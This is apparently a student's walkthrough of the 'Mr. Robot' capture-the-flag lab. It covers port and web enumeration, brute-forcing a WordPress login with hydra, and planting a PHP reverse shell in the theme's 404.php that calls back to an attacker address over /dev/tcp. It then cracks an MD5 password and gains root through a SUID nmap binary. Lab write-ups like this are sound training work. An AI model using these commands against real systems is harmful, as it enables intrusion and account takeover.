# Mr. Robot
## About Me

Hi, I'm Yuvraj Singh, a Computer Science and Engineering student with a strong interest in cybersecurity, penetration testing, and ethical hacking. I enjoy solving CTF challenges and hands-on security labs to improve my practical skills in enumeration, exploitation, privilege escalation, and vulnerability assessment. This write-up documents my approach and methodology for solving the Mr. Robot CTF challenge.

---

# Walkthrough

## Enumeration

After deploying the machine, I started with an Nmap scan to identify the available services.

```
nmap -A -Pn 10.49.186.254 -T4
```

<img width="946" height="647" alt="image" src="https://github.com/user-attachments/assets/f01f3ce0-3941-4a27-a8a8-50110df89072" />

The scan revealed three open ports:

- 22 (SSH)
- 80 (HTTP)
- 443 (HTTPS)

Since the web services appeared to be the primary attack surface, I continued with web enumeration.

---

## Web Enumeration

I performed directory and file fuzzing against the web server.

```
ffuf -u http://10.49.186.254/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt
```

<img width="913" height="617" alt="image" src="https://github.com/user-attachments/assets/2b161c74-22f8-4d16-8ee7-777049df3e9a" />

Among the discovered resources were:

- `robots.txt`
- `fsocity.dic`
- `wp-login.php`

Reviewing `robots.txt` revealed the first flag location. 

<img width="797" height="646" alt="image" src="https://github.com/user-attachments/assets/c5704d5f-7635-4fd3-a49b-b033954f43a9" />

Visiting the referenced path provided **Key 1 of 3**.

<img width="831" height="413" alt="image" src="https://github.com/user-attachments/assets/f8188de4-bb3b-4e78-b209-a16ca4651db4" />

The `fsocity.dic` file appeared to be a wordlist but contained many duplicate entries.

<img width="917" height="833" alt="image" src="https://github.com/user-attachments/assets/ba95bf34-0121-46cf-a798-db88d030200c" />

 I downloaded it as wordlist.txt and cleaned it using:

```
sort -u wordlist.txt > wordlist3.txt
```

---

## Username Enumeration

Next, I investigated the WordPress login portal.

<img width="938" height="832" alt="image" src="https://github.com/user-attachments/assets/c7c216c8-0687-4986-aacd-366a69d444fd" />

Attempting to log in with a random username generated an "Invalid Username" error. Since the room was themed around Mr. Robot, I tried the name **Elliot**, which produced a different response indicating that the username existed and only the password was incorrect.

<img width="557" height="615" alt="image" src="https://github.com/user-attachments/assets/d8f12eca-c698-4752-b1af-611fbdcb4c6e" />

This confirmed a valid account.

---

## Password Brute Force

Using the cleaned wordlist, I launched a password attack against the WordPress login form.

```
hydra -l elliot -P wordlist3.txt 10.49.186.254 http-form-post "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&testcookie=1:S=302"
```

<img width="930" height="211" alt="image" src="https://github.com/user-attachments/assets/767cf71d-df06-4fea-9e4f-aa5e29e61804" />

The attack successfully recovered Elliot's password.

With the discovered credentials, I authenticated to the WordPress admin dashboard.

<img width="948" height="807" alt="image" src="https://github.com/user-attachments/assets/6bcab7fc-c833-47e1-934e-d5e06314eced" />

---

## Initial Access

After reviewing the dashboard, I inspected themes, users, and plugins. Nothing immediately useful stood out except the built-in theme editor.

Within the editor, I located the `404.php` template. Since 404 pages are only triggered when a missing resource is requested, it provided a suitable location to execute custom code without affecting normal site functionality.

I replaced the existing code with a PHP reverse shell payload configured to connect back to my attacking machine.

```
<?php
exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.157.65/4444 0>&1'");
?>
```

<img width="951" height="687" alt="image" src="https://github.com/user-attachments/assets/33ed3d37-055e-4b7e-a98c-1142a679e5cc" />

Before triggering the payload by entering the /404.php after the wp-login, I started a Netcat listener.

```
nc -lvnp 4444
```

I then requested a non-existent page to trigger the modified `404.php` template and received a reverse shell.

<img width="821" height="118" alt="image" src="https://github.com/user-attachments/assets/39c3cf94-fe51-455c-85a4-a4b6a7a6f29a" />

---

## Privilege Escalation to Robot

After stabilizing the shell, I searched the system for additional flags.

```
find / -name "key-2-of-3.txt" 2>/dev/null
```

<img width="802" height="52" alt="image" src="https://github.com/user-attachments/assets/b2d215ca-1eac-4897-ba09-23a798828ec2" />

A second key file was discovered, but permission restrictions prevented direct access.

While enumerating the filesystem, I found a file containing credentials associated with the user **robot**.

<img width="456" height="173" alt="image" src="https://github.com/user-attachments/assets/2ce30b66-f910-445e-b0d3-5d33a57f8e5b" />

The password was stored as an MD5 hash. After cracking it, I obtained the plaintext password and switched to the robot account.

```
encrypted MD5 hash = c3fcd3d76192e4007dfb496cca67e13b
decrypted hash = abcdefghijklmnopqrstuvwxyz
```

```
su robot
```

Once authenticated, I was able to access and read **Key 2 of 3**.

<img width="416" height="237" alt="image" src="https://github.com/user-attachments/assets/58dfeded-1da2-4708-a180-67f5c99b95f2" />

---

## Privilege Escalation to Root

To identify potential privilege escalation vectors, I searched for SUID binaries.

```
find / -perm -4000 -type f 2>/dev/null
```

<img width="472" height="291" alt="image" src="https://github.com/user-attachments/assets/e5d5de9e-5264-4b3d-b4bf-8295e7937757" />

One interesting result was an older version of Nmap with the SUID bit set.

Researching this version revealed that it supported Interactive Mode, which could be abused to obtain a root shell when executed with elevated privileges.

I launched Nmap's interactive mode and escaped to a shell.

```
nmap --interactive
```

After spawning the shell, I confirmed root access.

```
whoami
```

Output:

```
root
```

<img width="426" height="100" alt="image" src="https://github.com/user-attachments/assets/506f750c-c8d7-43c5-a84b-7ebcad887322" />

---

## Capture the Final Flag

With root privileges obtained, I navigated to the root user's directory and retrieved the final key.

```
cd /root
ls
cat key-3-of-3.txt
```

<img width="426" height="188" alt="image" src="https://github.com/user-attachments/assets/5d4fb3d6-3b96-4516-9690-9fac349d6335" />

---

## Conclusion

This room demonstrated a complete attack chain involving web enumeration, WordPress user enumeration, credential attacks, obtaining a reverse shell through theme modification, lateral movement to another user, and finally privilege escalation via a vulnerable SUID-enabled Nmap binary. Successfully retrieving all three keys completed the challenge.
